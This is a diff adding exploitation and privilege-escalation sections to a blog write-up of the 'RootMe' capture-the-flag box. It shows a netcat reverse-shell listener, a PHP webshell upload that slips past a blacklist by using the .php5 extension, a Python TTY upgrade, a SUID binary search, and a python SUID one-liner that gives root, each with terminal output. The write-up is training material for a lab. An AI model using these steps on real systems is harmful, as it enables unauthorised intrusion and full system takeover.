@@ -86,10 +86,121 @@ Progress: 20469 / 20470 (100.00%)
 ===============================================================
 ```
 Here we find the standard htaccess, css, js, etc. directories, but then we also find /panel, /server-status, and /uploads.  
-My initial thought is that if we have some way to upload files on the panel, we can LFI our way to executing a php webshell.  This will depend of course, on the contents of the panel.  
+My initial thought is that if we have some way to upload files on the panel, we can LFI our way to executing a PHP webshell from /uploads.  This will depend of course, on the contents of the panel.  
 
 #### The Panel!
 The panel turned out to be exactly what I thought it might be.  It is literally just a file upload page.  Here's what it looks like:
 ![rootme panel](/images/2022/rootmePanel.png){:class="img-responsive"}
 
+## Exploitation
+I think we have enough information to get our shell.  
+Before going any farther, I setup a netcat listener with the tried and true `nc -nlvp 9501` for when I got a shell.
 
+I tried to upload the Pentestmonkey PHP webshell (renamed evil.php) but was given a bright red "PHP não é permitido!" message.  Sounds like I'll have to actually _try_ to get the LFI.
+![rootme webshell upload1](/images/2022/rootmeUpload1.png){:class="img-responsive"}
+
+Next, I attempted to rename the file to test the upload blacklist.  I tried things like evil.jpeg.php and evil.php.jpeg, but neither of those would run (they would upload though!).  I finally got it by renaming evil.php to evil.php5, where it uploads and we recieve a shell!
+![rootme webshell upload2](/images/2022/rootmeUpload2.png){:class="img-responsive"} 
+![rootme webshell uploads page](/images/2022/rootmeUploads.png){:class="img-responsive"}
+```
+nc -lvnp 9501
+listening on [any] 9501 ...
+connect to [darkwire] from (UNKNOWN) [10.10.121.102] 51770
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 18:35:33 up  1:23,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+When I get a shell, I like to upgrade it with Python to a TTY so I can use sudo and all that other good stuff.  
+To do so, I used `python3 -c 'import pty;pty.spawn("/bin/bash")'`.
+We are currently www-data, which is a low-privilege account, so let's get to work.
+I always check the home directory of my user to see if there are any interesting files there.  So:
+```
+www-data@rootme:/$ cd ~
+cd ~
+www-data@rootme:/var/www$ ls
+ls
+html  user.txt
+```
+There's the first flag!
+
+## Escalation
+The goal in this CTF is to get root on the box.  User is not enough!  
+The first thing I like to check is if there are any SUID binaries on the system.
+```
+www-data@rootme:/var/www$ find / -perm /4000 2>/dev/null
+find / -perm /4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9665/bin/mount
+/snap/core/9665/bin/ping
+/snap/core/9665/bin/ping6
+/snap/core/9665/bin/su
+/snap/core/9665/bin/umount
+/snap/core/9665/usr/bin/chfn
+/snap/core/9665/usr/bin/chsh
+/snap/core/9665/usr/bin/gpasswd
+/snap/core/9665/usr/bin/newgrp
+/snap/core/9665/usr/bin/passwd
+/snap/core/9665/usr/bin/sudo
+/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9665/usr/lib/openssh/ssh-keysign
+/snap/core/9665/usr/lib/snapd/snap-confine
+/snap/core/9665/usr/sbin/pppd
+/bin/mount
+/bin/su
+/bin/fusermount
+/bin/ping
+/bin/umount
+```
+Using `find` on the root directory will have a lot of permission denied lines, so I piped stderr to /dev/null.
+Python is in this list, which is a really big red flag, so I looked up the binariy with [gtfobins](https://gtfobins.github.io/) and found the exploit there. 
+```
+$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+root.txt
+```
+And there we have it.  The box is rooted.
+
+## Conclusion
+This box was pretty easy, with rather standard forms of exploitation.  I did learn a lot about blogging on this platorm though, which was the goal!  Thanks for reading!
